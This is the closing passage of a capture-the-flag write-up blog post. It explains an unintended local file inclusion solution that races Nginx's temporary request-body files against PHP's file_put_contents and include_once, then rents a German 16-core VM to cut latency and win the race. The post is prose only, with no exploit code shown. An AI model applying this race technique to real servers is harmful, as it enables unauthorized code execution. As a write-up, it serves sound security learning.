</span></code></pre><p>In addition to the Nginx creation and deletion race we now have another race - we need <code>file_put_contents()</code> to write to the path before the content is in it, and <code>include_once()</code> to be executed after Nginx writes the request body into it. This made us think - what happens when <code>file_put_contents()</code> is called on the Nginx FD path after it’s deleted? When we looked into the request body directory (<code>/var/lib/nginx/body/</code>) it was full with files formatted as <code>0000001337 (deleted)</code> (the number is Nginx’s auto-incremented file format). These files filled 80% of our local Docker’s storage, but when querying the remote server (reading <code>/sys/block/sda/sda1/size</code> via PHP) we found they have much more storage than us and we should be OK 🙂<p>Even though the exploit worked locally for <code>counter</code> (while filling the storage) - we couldn’t get it to work remotely, since winning the race is much less probable. Sniffing the traffic showed that there’s too much latency and packet loss at the rates we’re sending. Geo-locating the remote server showed that it’s in Germany while the exploit was running from US.<p>We decided to purchase a VPS in Azure in the Germany region. Running the script there improved the Nginx PID retrieval significantly (30 seconds to 5 seconds) but the exploit still didn’t show results. Eventually, we noticed the new VPS only had 4 cores. We spent a few more $ to buy a 16-core VM in Germany, and got the flag within 5 seconds!<p>The conclusion - always use money to solve your problems!</div><div class=post-tags><a class=tag href=/tags/ctf>#ctf</a><a class=tag href=/tags/exploit>#exploit</a><a class=tag href=/tags/hxp>#hxp</a><a class=tag href=/tags/lfi>#lfi</a><a class=tag href=/tags/nginx>#nginx</a><a class=tag href=/tags/pasten>#pasten</a><a class=tag href=/tags/php>#php</a><a class=tag href=/tags/unintended>#unintended</a></div><div class=post-nav><a class=previous href=https://guylewin.com/blog/2022-03-02-bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi/><svg class=icon><use href=https://guylewin.com/icons.svg#chevronLeft></use></svg> Next Project</a><a class=next href=https://guylewin.com/blog/2021-09-16-bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant/>Previous Project <svg class=icon><use href=https://guylewin.com/icons.svg#chevronRight></use></svg></a></div></article></main><footer><hr><div id=footer-container><p>Made using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> Zola theme</div></footer><script defer src=https://guylewin.com/js/script.js></script>